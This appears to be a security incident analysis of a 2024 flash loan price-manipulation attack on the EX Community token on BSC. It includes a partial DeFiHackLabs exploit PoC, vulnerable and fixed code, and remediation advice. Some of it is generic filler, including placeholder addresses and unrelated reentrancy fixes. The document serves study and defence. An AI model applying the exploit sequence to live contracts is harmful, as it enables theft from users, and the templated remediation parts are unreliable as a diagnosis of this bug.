# EX Community — Community Token Flash Loan Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2024-05-21 |
| **Protocol** | EX Community |
| **Chain** | BSC |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://bscscan.com/address/0x) |
| **Attack Tx** | [0x](https://bscscan.com/tx/0x) |
| **Vulnerable Contract** | [0x](https://bscscan.com/address/0x) |
| **Root Cause** | Community token reward/exchange logic relies on AMM spot reserves, allowing excess receipt via reserve manipulation within a single block |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/EXcommunity_exp.sol) |

---
## 1. Vulnerability Overview

EX Community is a DeFi protocol operating on the BSC chain that suffered a **flash loan / price manipulation** attack on 2024-05-21.
The attacker exploited a community token flash loan attack to cause approximately **unconfirmed** in damages.

### Key Vulnerability Summary
- **Classification**: Flash Loan / Price Manipulation
- **Impact**: Unconfirmed protocol asset loss
- **Attack Vector**: Price Manipulation

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: Community token flash loan attack
// The attacker exploits this logic to gain illegitimate profit

// EX Community interface — flash loan price manipulation vulnerable function
interface Boy {
    // ❌ Vulnerable: getPrice() returns EX token price based on instantaneous DEX balance
    // After manipulating price via large buy within pancakeV3FlashCallback, trades can be executed on favorable terms
    function getPrice() external returns (uint256);
}

interface Uni_Pair_V3 {
    // ❌ Vulnerable: consecutive swaps can be executed at manipulated price inside flash callback
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface Uni_Pair_V2 {
    // ❌ Vulnerable: skim can induce pool balance / reserve desync to enable price manipulation
    function skim(address to) external;
}

interface Uni_Router_V2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

// ✅ Correct implementation: block price queries during flash loan + use TWAP
function safeGetPrice() external returns (uint256) {
    // ✅ Block price queries while flash loan callback is executing
    require(!pancakeV3FlashActive, "Price: flash loan active");
    // ✅ Return TWAP price instead of instantaneous balance (manipulation-resistant)
    uint256 twapPrice = getTWAPPrice(TWAP_PERIOD);
    require(twapPrice > 0, "Price: invalid TWAP");
    // ✅ Detect skim attack: check deviation between reserve and actual balance
    (uint256 reserve0, uint256 reserve1,) = Uni_Pair_V2(pair).getReserves();
    uint256 actualBalance = IERC20(token).balanceOf(pair);
    require(actualBalance <= reserve0 * 110 / 100, "Price: skim attack detected");
    return twapPrice;
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Flash Loan Borrow] ──── BSC DEX/Lending
  │                    (Large token borrow)
  ▼
[Price/State Manipulation] ─── Vulnerable Contract
  │                    (Internal state modification)
  ▼
[Illegitimate Profit Extraction] ─── Token withdrawal/swap
  │
  ▼
[Flash Loan Repayment] ──── Profit secured
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - EXcommunity_exp.sol
// Chain: BSC | Date: 2024-05-21

    function testExploit() external {
        emit log_named_decimal_uint("[End] Attacker bnb before exploit", address(this).balance, 18);
        Pool.flash(address(this), 400_000_000_000_000_000_000_000, 0, "0x123");
        emit log_named_decimal_uint("[End] Attacker bnb after exploit", address(this).balance, 18);
        emit log_named_decimal_uint("[End] Attacker BUSDT after exploit", BUSDT.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker boy  after exploit", boy.balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        swap_token_to_token(address(BUSDT), address(Girl), 1 ether);
        uint256 helpContractAmount = 10;
        uint256 i = 0;
        while (i < helpContractAmount) {
            address money = cal_address(i);
            Myaddress.push(money);
            i++;
        }
        create_contract(helpContractAmount);
        for (uint256 i = 0; i < Myaddress.length; i++) {
            address(Myaddress[i]).call{value: 3 ether}(abi.encodeWithSignature("buy()"));
            vm.roll(block.number + 1);
            address(Myaddress[i]).call(abi.encodeWithSignature("send()"));
        }
        BUSDT.transfer(address(Pair), 399_000 ether);
        uint256 j = 0;
        while (j < 290) {
            Girl.transferFrom(address(Pair), address(this), 0);
            j++;
        }
        Pair.skim(address(this));
        Girl.transfer(address(this), 1_000_000);
        console.log("price", boy.getPrice());
        boy.transfer(address(boy), 25_380_992_089_360_281_325_724);
        WBNB.deposit{value: 0.4 ether}();
        swap_token_to_token(address(WBNB), address(BUSDT), 0.4 ether);
        BUSDT.transfer(msg.sender, 400_000 * 1e18 + fee0);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    function cal_address(
        uint256 time
    ) internal returns (address) {
        bytes memory bytecode = type(Money).creationCode;
        uint256 _salt = time;
        bytecode = abi.encodePacked(bytecode);
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        address hack_contract = address(uint160(uint256(hash)));
        return hack_contract;
    }

    function create_contract(
        uint256 times
    ) internal {
```

> **Note**: The above code is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Classification Criteria | Details |
|-----------|------|
| **DASP Top 10** | Price Manipulation |
| **Attack Type** | Flash Loan Attack |
| **Vulnerability Category** | Economic Attack |
| **Attack Complexity** | High (requires flash loan) |
| **Preconditions** | Sufficient gas fees and flash loan access |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code modification) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable functions**: Apply emergency pause to affected functions
2. **Assess damage**: Classify scale of lost assets and affected users
3. **Notify relevant parties**: Immediately notify related DEXes, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not use only the current spot price
}
```

### Long-term Improvements
- Conduct **independent security audits** (minimum 2 audit firms)
- Operate a **bug bounty program**
- Establish a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency pause mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Flash loan / price manipulation attacks are preventable**: Defensible through proper validation and pattern application
2. **Consider economic incentives**: All functions must be designed with attacker economic motivation in mind
3. **Audit priority**: Functions that directly handle assets are top-priority audit targets

### For Protocol Operators
1. **Real-time monitoring**: Establish a system to immediately detect abnormal large-scale transactions
2. **Incident response plan**: Maintain an immediately executable response playbook in the event of an attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the Broader DeFi Ecosystem
- The **2024-05-21** EX Community incident reconfirms the danger of **flash loan / price manipulation** attacks in the BSC ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Strengthening community-level security information sharing is recommended

---
*This document was prepared for educational and security research purposes. Do not misuse.*
*PoC original: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/EXcommunity_exp.sol)*